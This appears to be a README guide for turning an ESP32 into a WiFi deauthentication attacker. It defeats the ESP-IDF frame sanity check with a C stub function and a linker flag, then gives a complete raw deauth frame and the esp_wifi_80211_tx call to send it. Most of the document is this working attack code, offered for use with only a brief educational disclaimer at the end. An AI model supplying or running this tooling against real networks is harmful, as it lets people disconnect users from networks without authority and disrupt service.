# ESP32 WiFi Deauth Bypass Fix - "unsupport frame type: 0xc0" Solution

## Problem

If you continually receive the following error when attempting a WiFi deauthentication attack on the ESP32:

```
E (xxxxx) wifi:unsupport frame type: 0c0
```

This is caused by the ESP-IDF `ieee80211_raw_frame_sanity_check` function blocking deauth frames by default.

## Non-Working Methods

### 1. Weak Attribute in C++ Files (ESP-IDF 6.5.0+)
```cpp
// THIS DOES NOT WORK
extern "C" int __attribute__((weak))
ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
    return 0;
}
```

**Why it fails:**
- The ESP-IDF WiFi library is provided as a precompiled binary.
- C++ name mangling prevents the linker from properly overriding the symbol.
- The weak branch attribute often does not have sufficient priority over the precompiled library.

### 2. Using only `-Wl,-zmuldefs` Flag
Adding the linker flag without providing a proper C replacement will not resolve the C++ name mangling issue described above.

## Working Solution: Pure C Bypass

### Step 1: Create a Separate C File

Create a new file at **`src/wifi/wifi_bypass.c`**:

```c
#include <stdint.h>

/**
 * @brief ESP-IDF WiFi sanity check bypass
 * 
 * MUST be in a separate .c file (not .cpp) for proper linking.
 * Returns 0 to bypass all frame validation.
 */
int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
    return 0;  // Always allow frame transmission
}
```

### Step 2: Update platformio.ini

Add the following build flags to your configuration:

```ini
[env:esp32dev]
platform = espressif32@6.5.0  ; or newer
board = esp32dev
framework = arduino

build_flags = 
    -DCORE_DEBUG_LEVEL=0
    -Os
    -Wl,--gc-sections
    -Wl,-zmuldefs  ; REQUIRED
```

### Step 3: Send Deauth Packet

Ensure you use the correct function to transmit the frame:

```cpp
#include "esp_wifi.h"

// Deauth frame definition (26 bytes)
uint8_t deauth_frame[] = {
    0xc0, 0x00, 0x3a, 0x01,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,  // Destination (broadcast)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // Source (AP BSSID)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // BSSID
    0xf0, 0xff, 0x02, 0x00               // Seq + Reason
};

// Set AP BSSID
memcpy(&deauth_frame[10], target_bssid, 6);
memcpy(&deauth_frame[16], target_bssid, 6);

// Transmit
esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, 26, false);
```

## Technical Details

### Why Pure C is Required

| Aspect | C++ (.cpp) | Pure C (.c) |
|--------|-----------|-------------|
| Name Mangling | Yes | No |
| Symbol Name | `_Z32ieee80211_raw_frame_sanity_check...` | `ieee80211_raw_frame_sanity_check` |
| Linker Override | Fails | Works |

### Linking Order

```
1. User code object files (.c.o, .cpp.o)
   └─> wifi_bypass.c.o (CONTAINS: ieee80211_raw_frame_sanity_check)
2. Precompiled libraries
   └─> libnet80211.a (CONTAINS: ieee80211_raw_frame_sanity_check - IGNORED)
```

The `-Wl,-zmuldefs` flag tells the linker to ignore multiple definition errors and use the first occurrence (our custom implementation).

## Checklist

- [ ] `wifi_bypass.c` created
- [ ] `-Wl,-zmuldefs` flag added
- [ ] WiFi mode set to `WIFI_AP` or `WIFI_APSTA`
- [ ] `esp_wifi_80211_tx(WIFI_IF_AP, ...)` used
- [ ] Build successful
- [ ] Test verified (no 0xc0 error)

## Verified Environment

- ESP-IDF 4.4+ (espressif32@6.5.0)
- Arduino Framework 2.0.14
- ESP32 DevKit V1
- PlatformIO

## References

- [esp32-wifi-penetration-tool WSL Bypasser](https://github.com/risinek/esp32-wifi-penetration-tool/tree/master/components/wsl_bypasser)
- [GANESH-ICMC esp32-deauther](https://github.com/GANESH-ICMC/esp32-deauther)

## Disclaimer

**For educational purposes only.** Performing WiFi deauthentication attacks:
- Is illegal if done without permission
- Should only be performed on networks you own or have explicit permission to test
- Read IEEE 802.11w (PMF) for information on responsible disclosure and defenses

---

**Contributors:**
- Original research: risinek (esp32-wifi-penetration-tool)
- Binary patching: GANESH-ICMC
- PlatformIO solution: ANKA Project

**License:** MIT

*Last Updated: 2026-02-01*
